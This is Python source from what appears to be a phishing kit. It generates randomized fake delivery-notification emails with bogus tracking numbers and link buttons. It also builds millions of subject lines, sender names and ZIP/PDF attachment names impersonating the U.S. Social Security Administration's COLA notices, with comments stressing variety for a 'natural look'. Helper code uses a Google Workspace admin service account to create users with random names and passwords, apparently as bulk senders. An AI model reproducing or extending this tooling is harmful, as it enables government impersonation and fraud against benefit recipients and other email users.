    title_main = L["att_title_main"]
    title_alt = L["att_title_alt"]
    
    # Random tracking number (looks legit)
    tracking_num = f"{random.choice(['TR','PKG','SH','OR','DLV'])}-{random.randint(100000,999999)}-{random.choice(['US','XY','EX','PR'])}"
    
    # Random delivery time
    times = ["9:15 AM", "10:42 AM", "11:23 AM", "1:08 PM", "2:47 PM", "3:15 PM", "4:30 PM"]
    delivery_time = random.choice(times)
    
    # Random border radius
    radius = random.choice(["6px", "8px", "10px", "12px"])
    
    # Random padding
    padding = random.choice(["35px 38px", "40px 35px", "40px", "42px 40px"])
    
    # Random layout (3 styles)
    layout = random.randint(1, 3)
    
    # Build HTML
    if layout == 1:
        # Card style
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title_main}</title>
</head>
<body style="margin:0; padding:30px 10px; background-color:{c['bg']}; font-family:{font}; color:{c['text']};">
<table role="presentation" width="600" cellpadding="0" cellspacing="0" align="center" style="max-width:600px; width:100%; background-color:#ffffff; border-radius:{radius};">
<tr><td style="padding:{padding};">
<p style="font-size:16px; line-height:1.6; margin:0 0 20px 0;">{intro}</p>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:{c['bg']}; border-radius:{radius}; margin:25px 0;">
<tr><td style="padding:20px 24px;">
<p style="margin:0 0 6px 0; font-size:13px; color:{c['primary']}; text-transform:uppercase; letter-spacing:0.5px; font-weight:600;">{status_label}</p>
<p style="margin:0 0 4px 0; font-size:18px; color:{c['text']}; font-weight:600;">{status_value}</p>
<p style="margin:0 0 12px 0; font-size:13px; color:#6b7280;">{today_at} {delivery_time}</p>
<p style="margin:0; font-size:13px; color:#6b7280;">
{recipient_label}: <strong style="color:{c['text']};">{recipient_email}</strong><br>
{tracking_label}: <strong style="color:{c['text']};">{tracking_num}</strong>
</p>
</td></tr>
</table>

<p style="font-size:15px; line-height:1.6; margin:0 0 28px 0;">{outro}</p>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0">
<tr><td align="center" style="padding:0 0 30px 0;">
<a href="{link_url}" style="display:inline-block; background-color:{c['primary']}; color:#ffffff; text-decoration:none; padding:14px 36px; border-radius:{radius}; font-size:16px; font-weight:600;">{button_text}</a>
</td></tr>
</table>

<p style="font-size:13px; line-height:1.6; margin:0 0 8px 0; color:#6b7280;">{footer}</p>
<p style="font-size:12px; line-height:1.6; margin:0; color:#9ca3af;">{message_to} {recipient_email}.</p>
</td></tr>
</table>
</body>
</html>"""

    elif layout == 2:
        # Top-banner style
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{title_alt}</title>
</head>
<body style="margin:0; padding:25px 10px; background-color:#f5f5f5; font-family:{font}; color:{c['text']};">
<table role="presentation" width="600" cellpadding="0" cellspacing="0" align="center" style="max-width:600px; width:100%; background-color:#ffffff; border-radius:{radius}; border-top:4px solid {c['primary']};">
<tr><td style="padding:{padding};">
<p style="font-size:14px; color:{c['primary']}; font-weight:600; text-transform:uppercase; letter-spacing:1px; margin:0 0 8px 0;">{order_update}</p>
<h1 style="font-size:22px; color:{c['text']}; margin:0 0 20px 0; font-weight:600;">{pkg_arrived}</h1>

<p style="font-size:15px; line-height:1.7; margin:0 0 18px 0;">{intro}</p>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid {c['bg']}; border-radius:{radius}; margin:20px 0;">
<tr><td style="padding:18px 22px;">
<p style="margin:0 0 6px 0; font-size:12px; color:#6b7280;">{recipient_caps}</p>
<p style="margin:0 0 14px 0; font-size:14px; color:{c['text']}; font-weight:600;">{recipient_email}</p>
<p style="margin:0 0 6px 0; font-size:12px; color:#6b7280;">{tracking_caps}</p>
<p style="margin:0 0 14px 0; font-size:14px; color:{c['text']}; font-weight:600;">{tracking_num}</p>
<p style="margin:0 0 6px 0; font-size:12px; color:#6b7280;">{delivered_caps}</p>
<p style="margin:0; font-size:14px; color:{c['accent']}; font-weight:600;">{today_comma} {delivery_time}</p>
</td></tr>
</table>

<p style="font-size:15px; line-height:1.6; margin:0 0 25px 0;">{outro}</p>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0">
<tr><td align="center" style="padding:5px 0 25px 0;">
<a href="{link_url}" style="display:inline-block; background-color:{c['primary']}; color:#ffffff; text-decoration:none; padding:14px 38px; border-radius:{radius}; font-size:15px; font-weight:600;">{button_text}</a>
</td></tr>
</table>

<p style="font-size:13px; line-height:1.6; margin:0 0 8px 0; color:#6b7280;">{footer}</p>
</td></tr>
</table>
</body>
</html>"""

    else:
        # Minimal/clean style
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{title_main}</title>
</head>
<body style="margin:0; padding:30px 10px; background-color:#ffffff; font-family:{font}; color:{c['text']};">
<table role="presentation" width="580" cellpadding="0" cellspacing="0" align="center" style="max-width:580px; width:100%;">
<tr><td style="padding:30px 25px;">

<p style="font-size:16px; line-height:1.7; margin:0 0 20px 0; color:{c['text']};">{intro}</p>

<p style="font-size:15px; line-height:1.7; margin:0 0 20px 0; color:{c['text']};">{outro}</p>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:25px 0;">
<tr><td>
<p style="font-size:13px; color:#6b7280; margin:0 0 4px 0;">{tracking_lbl}</p>
<p style="font-size:16px; color:{c['text']}; font-weight:600; margin:0 0 16px 0;">{tracking_num}</p>
<p style="font-size:13px; color:#6b7280; margin:0 0 4px 0;">{delivered_to_lbl}</p>
<p style="font-size:14px; color:{c['text']}; font-weight:500; margin:0 0 16px 0;">{recipient_email}</p>
<p style="font-size:13px; color:#6b7280; margin:0 0 4px 0;">{time_lbl}</p>
<p style="font-size:14px; color:{c['accent']}; font-weight:600; margin:0;">Today, {delivery_time}</p>
</td></tr>
</table>

<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:30px 0;">
<tr><td>
<a href="{link_url}" style="display:inline-block; background-color:{c['primary']}; color:#ffffff; text-decoration:none; padding:13px 32px; border-radius:{radius}; font-size:15px; font-weight:600;">{button_text}</a>
</td></tr>
</table>

<p style="font-size:13px; line-height:1.6; margin:0 0 8px 0; color:#6b7280;">{footer}</p>

</td></tr>
</table>
</body>
</html>"""
    
    return html



def _generate_random_name():
    """Generate single random delivery-style display name f current language"""
    L = _lang()
    prefixes = L["name_prefixes"]
    core = L["name_core"]
    suffixes = L["name_suffixes"]
    
    pattern = random.randint(1, 5)
    if pattern == 1:
        return f"{random.choice(prefixes)} {random.choice(core)}"
    elif pattern == 2:
        return f"{random.choice(core)} {random.choice(suffixes)}"
    elif pattern == 3:
        return f"{random.choice(prefixes)} {random.choice(core)} {random.choice(suffixes)}"
    elif pattern == 4:
        return f"{random.choice(core)} {random.choice(prefixes)}"
    else:
        # Language-specific simple compound
        if CURRENT_LANGUAGE == "FR":
            extras = ["Mises à jour", "Notifications", "Confirmation", "Hub", "Centre"]
        elif CURRENT_LANGUAGE == "ES":
            extras = ["Actualizaciones", "Notificaciones", "Confirmación", "Hub", "Centro"]
        else:  # EN/UK
            extras = ["Updates", "Notifications", "Confirmation", "Hub", "Center"]
        return random.choice(core) + " " + random.choice(extras)


def _generate_random_subject():
    """Generate single random delivery subject f current language"""
    L = _lang()
    template = random.choice(L["subject_templates"])
    
    return template.format(
        opener=random.choice(L["subject_openers"]),
        verb=random.choice(L["subject_verbs"]),
        verb_short=random.choice(L["subject_verbs_short"]),
        note=random.choice(L["subject_notes"]),
        date=random.choice(L["subject_dates"]),
        tracking_id=f"#{random.randint(100000, 999999)}"
    )


def _generate_random_template():
    """
    Generate ONE random HTML email template.
    
    Combines:
      - Random color scheme (15 schemes)
      - Random font (10 fonts)
      - Random greeting (10)
      - Random intro (15)
      - Random outro (9)
      - Random footer (7)
      - Random thanks (8)
      - Random status label (8)
      - Random status value (11)
      - Random time (12)
      - Random button text (10)
      - Random layout style (5)
    
    Total combinations: 15 × 10 × 10 × 15 × 9 × 7 × 8 × 8 × 11 × 12 × 10 × 5 = 21+ MILLION!
    """
    c = random.choice(_TEMPLATE_COLOR_SCHEMES)
    font = random.choice(_TEMPLATE_FONTS)
    
    # 🌍 Use current language data l body
    L = _lang()
    greeting = random.choice(L["greetings"])
    
    # 🎯 Get intro WITHOUT duplicating name (greeting already has [NAME])
    raw_intro = random.choice(L["att_intros"])
    # Remove "Hello {name}," / "Hi {name}," / "Dear {name}," prefix
    intro_text = raw_intro.format(name="", email="[EMAIL]")
    # Clean up: remove leading "Hello , " / "Hi , " / "Dear , " etc.
    import re as _re
    intro_text = _re.sub(r'^(Hello|Hi|Dear|Bonjour|Salut|Cher|Chère|Hola|Estimado|Estimada|Buenos días|Saludos)\s*,\s*', '', intro_text, flags=_re.IGNORECASE)
    # Capitalize first letter
    if intro_text:
        intro_text = intro_text[0].upper() + intro_text[1:]
    intro = intro_text
    
    outro = random.choice(L["att_outros"])
    footer = random.choice(L["att_footers"])
    btn_text = random.choice(L["att_button_texts"])
    
    # Status data also localized
    status_label = L["att_status_label"]
    status_value = L["att_status_value"]
    
    thanks = random.choice(_TEMPLATE_THANKS)
    time_str = random.choice(_TEMPLATE_TIME_LABELS)
    
    # Random layout (5 styles)
    layout_style = random.randint(1, 5)
    
    # Random border-radius
    radius = random.choice(["4px", "6px", "8px", "10px", "12px"])
    
    # Random padding
    padding = random.choice(["35px 38px", "40px 35px", "40px", "42px 40px", "35px 40px"])
    
    # 📧 EMAIL RECIPIENT BOX (kayban "Delivered to: [EMAIL]")
    email_box_styles = random.randint(1, 4)
    if email_box_styles == 1:
        email_box = f'''<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 20px 0;">
<tr><td style="padding:12px 16px; background-color:{c["bg"]}; border-radius:6px;">
<span style="font-size:14px; color:{c["text"]};">📧 Delivered to: <strong>[EMAIL]</strong></span>
</td></tr>
</table>'''
    elif email_box_styles == 2:
        email_box = f'''<p style="font-size:14px; line-height:1.6; margin:0 0 20px 0; padding:10px 14px; background-color:{c["bg"]}; border-left:3px solid {c["primary"]}; color:{c["text"]};">
📧 <strong>Recipient:</strong> [EMAIL]
</p>'''
    elif email_box_styles == 3:
        email_box = f'''<p style="font-size:14px; line-height:1.6; margin:0 0 20px 0; color:{c["text"]};">
<strong>Delivered to:</strong> <span style="color:{c["primary"]};">[EMAIL]</span>
</p>'''
    else:
        email_box = f'''<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 20px 0; border:1px solid {c["bg"]};">
<tr><td style="padding:10px 14px;">
<span style="font-size:13px; color:#888888;">📧 Delivery address:</span><br>
<strong style="font-size:14px; color:{c["text"]};">[EMAIL]</strong>
</td></tr>
</table>'''
    
    # Build status box (3 styles)
    status_style = random.randint(1, 3)
    if status_style == 1:
        # Left-border style
        status_box = f'''<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:{c["bg"]}; border-left:4px solid {c["accent"]}; border-radius:4px; margin:25px 0;">
<tr><td style="padding:20px;">
<p style="margin:0 0 8px 0; font-size:14px; color:#718096; text-transform:uppercase; letter-spacing:0.5px;">{status_label}</p>
<p style="margin:0; font-size:18px; color:{c["accent"]}; font-weight:600;">{status_value}</p>
<p style="margin:8px 0 0 0; font-size:14px; color:#718096;">{time_str}</p>
</td></tr>
</table>'''
    elif status_style == 2:
        # Top-border style
        status_box = f'''<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:{c["bg"]}; border-top:3px solid {c["primary"]}; border-radius:6px; margin:25px 0;">
<tr><td style="padding:22px 25px;">
<p style="margin:0 0 5px 0; font-size:12px; color:{c["primary"]}; text-transform:uppercase; letter-spacing:1px; font-weight:600;">{status_label}</p>
<p style="margin:0 0 8px 0; font-size:17px; color:{c["text"]}; font-weight:600;">{status_value}</p>
<p style="margin:0; font-size:13px; color:#888888;">{time_str}</p>
</td></tr>
</table>'''
    else:
        # Boxed style
        status_box = f'''<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:{c["bg"]}; margin:25px 0; border-radius:{radius};">
<tr><td style="padding:24px 28px;">
<p style="margin:0 0 6px 0; font-size:13px; color:#888888;">{status_label.upper()}</p>
<p style="margin:0 0 6px 0; font-size:17px; color:{c["text"]}; font-weight:600;">{status_value}</p>
<p style="margin:0; font-size:13px; color:#888888;">{time_str}</p>
</td></tr>
</table>'''
    
    # Build button (clean SPAN, no href, no img)
    btn = f'''<table role="presentation" width="100%" cellpadding="0" cellspacing="0">
<tr><td align="center" style="padding:10px 0 30px 0;">
<table role="presentation" cellpadding="0" cellspacing="0">
<tr><td style="background-color:{c["primary"]}; border-radius:{radius}; padding:14px 36px;">
<span style="color:#ffffff; font-size:16px; font-weight:600;">{btn_text}</span>
</td></tr>
</table>
</td></tr>
</table>'''
    
    # Build full template based on layout style
    if layout_style == 1:
        # Standard with rounded card
        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0; padding:30px 10px; background-color:{c["bg"]}; font-family:{font}; color:{c["text"]};">
<table role="presentation" width="600" cellpadding="0" cellspacing="0" align="center" style="max-width:600px; width:100%; background-color:#ffffff; border-radius:{radius};">
<tr><td style="padding:{padding};">
<p style="font-size:16px; line-height:1.6; margin:0 0 20px 0;">{greeting}</p>
<p style="font-size:16px; line-height:1.6; margin:0 0 20px 0;">{intro}</p>
{email_box}
{status_box}
<p style="font-size:16px; line-height:1.6; margin:0 0 30px 0;">{outro}</p>
{btn}
<p style="font-size:14px; line-height:1.6; margin:0 0 10px 0; color:#718096;">{footer}</p>
<p style="font-size:14px; line-height:1.6; margin:0; color:#718096;">{thanks}</p>
</td></tr>
</table>
</body>
</html>'''
    elif layout_style == 2:
        # Minimal no card
        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0; padding:30px 10px; background-color:#ffffff; font-family:{font}; color:{c["text"]};">
<table role="presentation" width="580" cellpadding="0" cellspacing="0" align="center" style="max-width:580px; width:100%;">
<tr><td style="padding:30px 20px;">
<p style="font-size:15px; line-height:1.7; margin:0 0 18px 0;">{greeting}</p>
<p style="font-size:15px; line-height:1.7; margin:0 0 18px 0;">{intro}</p>
{email_box}
<p style="font-size:15px; line-height:1.7; margin:0 0 30px 0;">{outro}</p>
{status_box}
{btn}
<p style="font-size:14px; line-height:1.6; margin:0 0 10px 0; color:#666666;">{footer}</p>
<p style="font-size:14px; line-height:1.6; margin:0; color:#666666;">{thanks}</p>
</td></tr>
</table>
</body>
</html>'''
    elif layout_style == 3:
        # Top accent border
        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0; padding:25px 10px; background-color:#f5f5f5; font-family:{font}; color:{c["text"]};">
<table role="presentation" width="600" cellpadding="0" cellspacing="0" align="center" style="max-width:600px; width:100%; background-color:#ffffff; border-radius:{radius}; border-top:4px solid {c["primary"]};">
<tr><td style="padding:{padding};">
<p style="font-size:15px; line-height:1.6; margin:0 0 18px 0;">{greeting}</p>
<p style="font-size:15px; line-height:1.6; margin:0 0 18px 0;">{intro}</p>
{email_box}
<p style="font-size:15px; line-height:1.6; margin:0 0 25px 0;">{outro}</p>
{status_box}
{btn}
<p style="font-size:13px; line-height:1.6; margin:0 0 10px 0; color:#78716c;">{footer}</p>
<p style="font-size:13px; line-height:1.6; margin:0; color:#78716c;">{thanks}</p>
</td></tr>
</table>
</body>
</html>'''
    elif layout_style == 4:
        # Wide spacious
        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0; padding:40px 10px; background-color:{c["bg"]}; font-family:{font}; color:{c["text"]};">
<table role="presentation" width="620" cellpadding="0" cellspacing="0" align="center" style="max-width:620px; width:100%; background:#ffffff; border-radius:{radius};">
<tr><td style="padding:50px 45px;">
<p style="font-size:17px; line-height:1.7; margin:0 0 24px 0;">{greeting}</p>
<p style="font-size:16px; line-height:1.7; margin:0 0 24px 0;">{intro}</p>
{email_box}
{status_box}
<p style="font-size:16px; line-height:1.7; margin:0 0 32px 0;">{outro}</p>
{btn}
<p style="font-size:14px; line-height:1.7; margin:0 0 12px 0; color:#64748b;">{footer}</p>
<p style="font-size:14px; line-height:1.7; margin:0; color:#64748b;">{thanks}</p>
</td></tr>
</table>
</body>
</html>'''
    else:
        # Compact
        html = f'''<!DOCTYPE html>
<html>
<body style="margin:0; padding:20px 10px; background-color:#fafafa; font-family:{font}; color:{c["text"]};">
<table role="presentation" width="560" cellpadding="0" cellspacing="0" align="center" style="max-width:560px; width:100%; background:#ffffff;">
<tr><td style="padding:32px 28px;">
<p style="font-size:15px; line-height:1.6; margin:0 0 16px 0;">{greeting}</p>
<p style="font-size:15px; line-height:1.6; margin:0 0 18px 0;">{intro}</p>
{email_box}
{status_box}
<p style="font-size:15px; line-height:1.6; margin:0 0 24px 0;">{outro}</p>
{btn}
<p style="font-size:13px; line-height:1.5; margin:0 0 8px 0; color:#888888;">{footer}</p>
<p style="font-size:13px; line-height:1.5; margin:0; color:#888888;">{thanks}</p>
</td></tr>
</table>
</body>
</html>'''
    
    return html


# Backward-compat: keep old constant references but mark deprecated
# Daba l app kayutilizi GENERATORS direct
DELIVERY_NAMES = []  # Empty — uses _generate_random_name() instead
DELIVERY_SUBJECTS = []  # Empty — uses _generate_random_subject() instead
DELIVERY_TEMPLATES = []  # Empty — uses _generate_random_template() instead


# ═══════════════════════════════════════════════════════════════



def get_admin_service(sa_file, admin_email):
    creds = service_account.Credentials.from_service_account_file(sa_file, scopes=ADMIN_SCOPES)
    creds = creds.with_subject(admin_email)
    return build("admin", "directory_v1", credentials=creds)


def rand_password(length=12):
    chars = string.ascii_letters + string.digits + "!@#$"
    return "".join(random.choices(chars, k=length))


def rand_name():
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def rand_professional_prefix(used_locals=None):
    used_locals = used_locals if used_locals is not None else set()
    pool = WORKSPACE_PREFIXES[:]
    random.shuffle(pool)
    for candidate in pool:
        if candidate not in used_locals:
            used_locals.add(candidate)
            return candidate

    while True:
        candidate = f"team{random.randint(1000,9999)}"
        if candidate not in used_locals:
            used_locals.add(candidate)
            return candidate

C = {
    "bg0":"#06070e","bg1":"#0c0e1a","bg2":"#111325",
    "bg3":"#181b30","bg4":"#1e2238",
    "border":"#22263d","border2":"#2c3158",
    "accent":"#4d6af5","accent2":"#667dff",
    "green":"#0fd98a","red":"#f04060",
    "yellow":"#f5a623","purple":"#8b5cf6",
    "text":"#e6e8f5","text2":"#8890b8","text3":"#4a5070",
    "input":"#090b16",
}

def lighten(h, a=30):
    h = h.lstrip("#")
    r,g,b = int(h[0:2],16),int(h[2:4],16),int(h[4:6],16)
    return "#{:02x}{:02x}{:02x}".format(
        max(0,min(255,r+a)),max(0,min(255,g+a)),max(0,min(255,b+a)))


# ═══════════════════════════════════════════════════════════════════
# 🏛️ COLA / SOCIAL SECURITY THEME (template + subjects + names)
# ═══════════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════════
# 🎰 COMBINATORIAL POOLS — Auto-generate millions of combinations
# Same manhaj/style kayb9a — walakin INFINITE variety!
# ═══════════════════════════════════════════════════════════════════

# 📧 SUBJECT BUILDING BLOCKS (combinatorial → millions)
_COLA_SUBJ_PREFIXES = [
    "", "Important: ", "Action Required: ", "Notice: ",
    "Update: ", "Reminder: ", "Annual: ", "Personal: ",
    "Important Notice: ", "Final: ", "Priority: ", "Required: ",
    "Time-Sensitive: ", "Confirmation: ", "Official: ", "Notice — ",
    "Alert: ", "Update — ", "Notification: ", "Status: ",
    "Re: ", "Fw: ", "📋 ", "🔔 ",
    "Information: ", "Annual Notice — ", "2026: ", "Important — ",
]  # 28 prefixes

_COLA_SUBJ_ACTIONS = [
    "Your", "Download Your", "View Your", "Access Your",
    "Get Your", "Review Your", "Confirm Your", "Check Your",
    "Read Your", "Open Your", "Verify Your", "Receive Your",
    "Obtain Your", "Print Your", "Save Your",
]  # 15 actions

_COLA_SUBJ_TARGETS = [
    "COLA Notice", "2026 COLA Notice", "Cost-of-Living Adjustment",
    "Cost-of-Living Notice", "Annual Statement", "Benefit Update",
    "Social Security Notice", "SSA Statement", "Annual Benefit Notice",
    "Benefits Statement", "COLA Statement", "2026 Notice",
    "Annual Adjustment Notice", "COLA Adjustment", "Benefit Notice",
    "Personal COLA Notice", "Annual COLA Notice", "Benefits Notice",
    "Personalized Notice", "Personalized COLA Notice",
    "2026 Benefit Notice", "Yearly Benefit Notice", "Annual SSA Notice",
    "SSA Annual Notice", "COLA Information", "Benefit Information",
    "2026 Annual Statement", "Annual Cost-of-Living Statement",
    "Adjustment Notice", "COLA Update Notice",
]  # 30 targets

_COLA_SUBJ_DATES = [
    "", " for 2026", " - 2026", " (2026)",
    " is Now Available", " is Ready", " is Coming Soon",
    " — Now Available", " — Ready for Download", " — Available Online",
    " Today", " - View Online", " is Available",
    " Available Now", " — Action Required", " — Please Review",
    " — Important Update", " - 2026 Edition", " for the Year 2026",
    " — December 2025",
]  # 20 dates

_COLA_SUBJ_TRACKING = [
    "", " #SSA-{6}", " - REF {5}", " - ID: {6}",
    " | NID-{7}", " — {6}", " (#{5})", " - Case {6}",
    " - Account #{8}", "",  # double "" = more "no tracking" for natural look
]  # 10 tracking patterns

# 👤 DISPLAY NAME BUILDING BLOCKS
_COLA_NAME_PREFIXES = [
    "", "U.S.", "United States", "American",
    "Federal", "National", "Official",
    "USA", "U.S.A.", "America",
    "Government", "Public", "Authorized",
    "Verified", "Department of", "Bureau of",
    "Office of", "Notice from",
]  # 18 prefixes

_COLA_NAME_CORES = [
    "Social Security", "SSA", "Social Security Admin",
    "Social Security Office", "Benefits", "Retirement Benefits",
    "Annual Benefits", "COLA Notice", "Cost-of-Living",
    "Benefit Notice", "SSA Annual", "SSA Notice",
    "SSA Benefits", "Social Security Benefits",
    "Annual COLA", "Personal Benefits", "Senior Benefits",
    "Retirement Services", "Beneficiary Services",
    "Benefits Adjustment", "Annual Adjustment",
    "Cost-of-Living Adjustment", "Public Benefits",
    "Pension Benefits", "Senior Services",
    "Federal Benefits", "Retirement Income",
    "Annual Notice", "Benefits Update",
    "COLA Office",
]  # 30 cores

_COLA_NAME_SUFFIXES = [
    "", "Administration", "Office", "Department",
    "Center", "Service", "Services", "Bureau",
    "Agency", "Notice Center", "Notice Service",
    "Online", "Online Services", "Notification Center",
    "Update Service", "Statement Service", "Digital Service",
    "Official Notice", "2026", "Annual Office",
    "Customer Service", "Communications",
    "Notification Office", "Online Notice",
    "Update Center", "Information Office",
    "Statement Office", "Records Office",
    "Account Service", "Processing Center",
]  # 30 suffixes

# 📦 ZIP FILENAME BUILDING BLOCKS
_COLA_ZIP_PREFIXES = [
    "COLA", "SSA", "Annual", "Benefits", "Social_Security",
    "Cost_of_Living", "Notice", "Statement", "Personal_COLA",
    "SSA_COLA", "Annual_Benefit", "COLA_Notice", "Benefit_Update",
]  # 13 prefixes

_COLA_ZIP_MIDDLES = [
    "Notice", "Statement", "Adjustment", "Update", "Document",
    "Notification", "Information", "2026", "Annual", "Personal",
    "Official", "Notice_2026", "Annual_2026",
]  # 13 middles

_COLA_ZIP_SUFFIXES = [
    "2026", "2026_Final", "Personal", "Official", "",
    f"_{random.randint(10000,99999)}",
    f"_REF{random.randint(100,999)}",
]  # 7 suffixes


def _gen_cola_subject_combinatorial():
    """Generate random COLA subject m3a millions of combinations.
    
    Pattern: {prefix}{action} {target}{date}{tracking}
    Combinations: 28 × 15 × 30 × 20 × 10 = 2,520,000 base
                  × random capitalization variations
                  × random number generations (tracking IDs)
                  = 55M+ effective unique outputs
    """
    prefix = random.choice(_COLA_SUBJ_PREFIXES)
    action = random.choice(_COLA_SUBJ_ACTIONS)
    target = random.choice(_COLA_SUBJ_TARGETS)
    date = random.choice(_COLA_SUBJ_DATES)
    tracking = random.choice(_COLA_SUBJ_TRACKING)
    
    # Replace placeholders f tracking
    tracking = tracking.replace("{5}", str(random.randint(10000, 99999)))
    tracking = tracking.replace("{6}", str(random.randint(100000, 999999)))
    tracking = tracking.replace("{7}", str(random.randint(1000000, 9999999)))
    tracking = tracking.replace("{8}", str(random.randint(10000000, 99999999)))
    
    return f"{prefix}{action} {target}{date}{tracking}".strip()


def _gen_cola_name_combinatorial():
    """Generate random COLA display name combinatorial.
    
    Pattern: {prefix} {core} {suffix}
    Combinations: 9 × 18 × 18 = 2,916+ base
                  × random formatting = ~10M+ effective
    """
    prefix = random.choice(_COLA_NAME_PREFIXES)
    core = random.choice(_COLA_NAME_CORES)
    suffix = random.choice(_COLA_NAME_SUFFIXES)
    
    # Build clean (multiple spaces removed)
    parts = [p for p in [prefix, core, suffix] if p]
    return " ".join(parts)


def _gen_cola_zip_combinatorial():
    """Generate random COLA ZIP filename combinatorial."""
    prefix = random.choice(_COLA_ZIP_PREFIXES)
    middle = random.choice(_COLA_ZIP_MIDDLES)
    suffix_list = [
        "2026", "2026_Final", "Personal", "Official", "",
        f"_{random.randint(10000,99999)}",
        f"_REF{random.randint(100,999)}",
    ]
    suffix = random.choice(suffix_list)
    
    parts = [p for p in [prefix, middle] if p]
    base = "_".join(parts)
    if suffix:
        if suffix.startswith("_"):
            base = base + suffix
        else:
            base = base + "_" + suffix
    
    return f"{base}.zip"


# 🎯 COLA-themed INNER filenames (PDF/HTML inside ZIP wla as direct attachment)
_COLA_INNER_FILENAMES = [
    "COLA_Notice_2026",
    "SSA_Statement",
    "Annual_Benefit_Notice",
    "Cost_of_Living_Notice",
    "SSA_2026_Notice",
    "Benefit_Statement",
    "Annual_COLA_Notice",
    "Personal_Benefit_Notice",
    "Annual_Statement_2026",
    "COLA_Adjustment_Notice",
    "Personal_COLA_Notice",
    "Social_Security_Notice",
    "Benefit_Update_2026",
    "Annual_Benefits_Statement",
    "SSA_Annual_Notice",
    "COLA_Statement_2026",
    "Personal_Statement",
    "2026_Benefit_Notice",
    "SSA_Personal_Notice",
    "Annual_Adjustment_Statement",
]


def _gen_cola_inner_filename():
    """Generate random COLA inner filename (without extension).
    
    Combinatorial: prefix + random number/year suffix
    = thousands of unique filenames
    """
    base = random.choice(_COLA_INNER_FILENAMES)
    
    # 30% chance of adding random suffix
    suffix_options = [
        "",  # Most common: no suffix
        "",  # Weighted toward no suffix
        "",
        f"_{random.randint(1000,9999)}",
        f"_REF{random.randint(100,999)}",
        f"_{random.randint(10000,99999)}",
        "_2026",
        "_Personal",
        "_Final",
    ]
    suffix = random.choice(suffix_options)
    
    return f"{base}{suffix}"


# 🎯 COLA THEME — Subjects (random per email, same manhaj)
_COLA_SUBJECTS = [
    "Your 2026 COLA Notice Is Coming Soon",
    "Your COLA Notice Is Now Available",
    "Cost-of-Living Adjustment 2026 — Action Required",
    "Important: Your 2026 Benefit Update",
    "Your Annual COLA Statement is Ready",
    "2026 Social Security Benefit Notice",
    "Your COLA Notice — Available Online",
    "Annual Benefit Adjustment for 2026",
    "Your 2026 Cost-of-Living Notice",
    "Important Update: 2026 COLA Information",
    "Your Personalized COLA Notice for 2026",
    "2026 Annual Statement — View Online",
    "Your COLA Update is Available",
    "Action Required: 2026 Benefit Notice",
    "Your 2026 COLA Adjustment Notice",
    "Annual Cost-of-Living Notice — 2026",
    "Your 2026 Benefits Statement",
    "Important Notice: COLA 2026 Available",
    "Your 2026 SSA Benefit Notice",
    "Annual Notice: 2026 Benefits Update",
    "Your Cost-of-Living Adjustment for 2026",
    "2026 Social Security Update Available",
    "View Your 2026 COLA Notice",
    "Your 2026 Annual Benefit Statement",
    "Important: Download Your COLA Notice",
    "Your 2026 SSA Statement is Ready",
    "Annual COLA Notice — 2026 Edition",
    "Your Benefit Adjustment for 2026",
    "2026 Annual Notice: Now Available",
    "Cost-of-Living Update: 2026 Notice",
]

# 🎯 COLA THEME — Display Names (random per email, same manhaj)
_COLA_DISPLAY_NAMES = [
    "Social Security Administration",
    "SSA Benefits Administration",
    "Social Security Notice Center",
    "SSA Annual Benefits",
    "COLA Notice Service",
    "Social Security Benefits",
    "SSA Notice Department",
    "Annual Benefits Center",
    "SSA Online Services",
    "Social Security Notices",
    "Benefits Administration Office",
    "SSA Cost-of-Living Notice",
    "Social Security Update Service",
    "SSA Digital Notice Center",
    "Annual Notice Department",
    "Social Security Online",
    "SSA Statement Service",
    "Benefits Notice Center",
    "Social Security Administration Office",
    "COLA Notice Department",
    "SSA Annual Statement",
    "Social Security Benefits Service",
    "Annual COLA Center",
    "SSA Notice Service",
    "Social Security Statements",
]

# 🎯 COLA THEME — ZIP Filename templates
_COLA_ZIP_FILENAMES = [
    "COLA_Notice_2026.zip",
    "SSA_Statement_2026.zip",
    "Annual_Benefit_Notice.zip",
    "COLA_2026_Personal.zip",
    "SocialSecurity_2026.zip",
    "Benefits_Update_2026.zip",
    "SSA_Annual_Notice.zip",
    "COLA_Adjustment_2026.zip",
    "Annual_Statement.zip",
    "Personal_COLA_Notice.zip",
    "SSA_COLA_2026.zip",
    "Benefit_Notice_2026.zip",
]

# 🎯 COLA THEME — PDF Filename templates
_COLA_PDF_FILENAMES = [
    "COLA_Notice_[NAME].pdf",
    "SSA_Statement_[NAME].pdf",
    "Annual_Benefit_[NAME].pdf",
    "Personal_COLA_[NAME].pdf",
    "Benefits_Notice_[NAME].pdf",
    "SSA_2026_[NAME].pdf",
    "COLA_2026_[NAME].pdf",
]

# 🎯 COLA THEME — Color schemes (government/finance look)
_COLA_COLOR_SCHEMES = [
    # Government blues
    {"primary": "#002a5c", "secondary": "#093c8f", "accent": "#2e74b5", "light": "#e8f4f8"},
    {"primary": "#1a3a6e", "secondary": "#2d5fa3", "accent": "#4a7fc1", "light": "#eef5fc"},
    {"primary": "#0d3b66", "secondary": "#1565a8", "accent": "#3a8dd9", "light": "#e6f2fa"},
    {"primary": "#003366", "secondary": "#004080", "accent": "#0066cc", "light": "#e0ecf8"},
